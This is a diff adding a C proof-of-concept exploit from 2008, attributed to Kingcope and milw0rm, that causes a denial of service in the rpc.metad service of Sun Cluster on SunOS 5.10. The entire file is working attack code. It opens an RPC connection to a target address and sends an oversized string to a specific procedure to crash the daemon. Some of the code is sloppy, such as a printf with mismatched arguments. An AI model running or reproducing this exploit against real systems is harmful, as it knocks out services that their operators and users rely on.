@@ -1,0 +1,75 @@
+/*##########################################################*/
+/*## SunOS 5.10 Sun Cluster rpc.metad DoS PoC              #*/
+/*## causes DoS on rpc.metad                     	   #*/
+/*## (C) 2008 - Kingcope                                   #*/
+/*##########################################################*/
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <rpc/rpc.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <errno.h>
+
+extern int optarg;
+
+#define METAD_PROG 100229
+#define METAD_VERS 2
+#define METAD_FUNC 6
+
+typedef struct{char *string;}req_t;
+
+bool_t xdr_req(XDR *xdrs,req_t *obj){
+    if(!xdr_string(xdrs,&obj->string,~0)) return(FALSE);
+    return(TRUE);
+}
+
+main(int argc,char **argv){
+    char buffer[30000],address[4],*b,*cmd;
+    int i,c,n,flag=1,vers=0,port=0,sck;
+    CLIENT *cl;enum clnt_stat stat;
+    struct hostent *hp;
+    struct sockaddr_in adr;
+    struct timeval tm={10,0};
+    req_t req;
+
+    printf("rpc.metad for solaris 10\n\n");
+
+    if(argc<2){
+        printf("usage: %s address\n",argv[0]);
+        exit(-1);
+    }
+
+    printf("Using version %d and request no. %d!!\n", METAD_VERS, METAD_FUNC);
+
+    printf("timeout=%d ",ntohl(*(unsigned long*)address),tm.tv_sec);
+    fflush(stdout);
+
+    adr.sin_family=AF_INET;
+    adr.sin_port=htons(port);
+    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
+        if((hp=gethostbyname(argv[1]))==NULL){
+            errno=EADDRNOTAVAIL;perror("error");exit(-1);
+        }
+        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
+    }
+
+    sck=RPC_ANYSOCK;
+    if(!(cl=clnttcp_create(&adr,METAD_PROG,METAD_VERS,&sck,0,0))){
+        clnt_pcreateerror("error");exit(-1);
+    }
+    cl->cl_auth=authunix_create("localhost",0,0,0,NULL);
+
+    memset(buffer, 'A', sizeof(buffer)); //buffer can also be small,this is not a bufover
+    buffer[3000]=0;
+
+    req.string=buffer;
+
+    stat=clnt_call(cl,METAD_FUNC,xdr_req,&req,xdr_void,NULL,tm);
+    if(stat==RPC_SUCCESS) {printf("\nerror: not vulnerable\n");
+    printf("sent!\n"); /* if(!flag) exit(0);*/
+
+    }
+}
+
+// milw0rm.com [2008-03-14]
